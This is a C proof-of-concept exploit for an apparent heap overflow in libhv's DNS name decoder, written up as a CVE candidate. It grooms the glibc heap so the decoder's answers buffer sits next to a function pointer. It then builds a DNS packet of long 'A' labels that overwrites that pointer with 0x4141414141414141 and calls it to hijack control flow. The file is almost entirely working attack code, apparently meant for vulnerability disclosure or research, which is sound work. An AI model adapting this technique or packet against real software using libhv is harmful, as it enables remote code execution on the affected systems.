// Control-flow hijack via libhv dns_name_decode heap overflow (CVE candidate).
//
// Layout (glibc, no ASAN):
//   A = malloc(280)  -> chunk at X   (0x120 bytes: 8 header + 280 usable)
//   B = malloc(280)  -> chunk at X+288  (adjacent; B's usable holds a fn pointer)
//   free(A)          -> A goes to tcache
//   dns_unpack(...)  -> answers = malloc(280) reuses A  (answers == A+8)
//   long name overflows answers[0].name[256] forward into B's fn pointer,
//   overwriting it with 0x4141414141414141 ("AAAAAAAA").
//   ((fn)B[0])() then jumps to 0x4141414141414141.
#include "dns.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef void (*fn_t)(void);

static void legit(void) {
    puts("[*] legit() called -- control flow NOT hijacked");
}

int main(void) {
    fn_t *A = (fn_t *)malloc(280); /* will be reused as dns->answers */
    fn_t *B = (fn_t *)malloc(280); /* victim: B[0] is the function pointer  */
    B[0] = legit;

    free(A); /* A -> tcache bin */

    unsigned char pkt[1024];
    memset(pkt, 0, sizeof(pkt));
    int off = 0;
    /* header: nquestion=0, nanswer=1 */
    pkt[off++] = 0x12; pkt[off++] = 0x34;
    pkt[off++] = 0x81; pkt[off++] = 0x80;
    pkt[off++] = 0x00; pkt[off++] = 0x00;
    pkt[off++] = 0x00; pkt[off++] = 0x01; /* nanswer = 1 */
    pkt[off++] = 0x00; pkt[off++] = 0x00;
    pkt[off++] = 0x00; pkt[off++] = 0x00;
    /* name: six 63-byte labels ("A"*63, valid DNS label length) ->
     * 6*63 + 5 dots = 383 output bytes; offsets 288..295 land on 'A'*8,
     * which overwrites B[0] (the function pointer) with 0x4141414141414141.
     * (0xFF would be >= 0xC0 -> misread as a compression pointer, so 0x3F is used.) */
    for (int lbl = 0; lbl < 6; lbl++) {
        pkt[off++] = 0x3F;
        for (int i = 0; i < 63; i++) pkt[off++] = 'A';
    }
    pkt[off++] = 0x00; /* NUL terminates dns_name_decode */
    /* rtype/rclass/ttl/datalen/data (dns_rr_unpack returns -1 here; irrelevant) */
    pkt[off++] = 0x00; pkt[off++] = 0x01;
    pkt[off++] = 0x00; pkt[off++] = 0x01;
    pkt[off++] = 0x00; pkt[off++] = 0x00; pkt[off++] = 0x00; pkt[off++] = 0x3c;
    pkt[off++] = 0x00; pkt[off++] = 0x04;
    pkt[off++] = 127; pkt[off++] = 0; pkt[off++] = 0; pkt[off++] = 1;

    dns_t dns;
    memset(&dns, 0, sizeof(dns));
    int r = dns_unpack((char *)pkt, off, &dns);
    printf("dns_unpack returned %d\n", r);
    printf("B[0] = %p\n", (void *)B[0]);

    if ((uintptr_t)B[0] == 0x4141414141414141ULL) {
        puts("[*] function pointer overwritten to 0x4141414141414141");
    }
    puts("[*] calling B[0]() ...");
    fflush(stdout);
    ((fn_t)B[0])(); /* RIP -> 0x4141414141414141 */
    return 0;
}
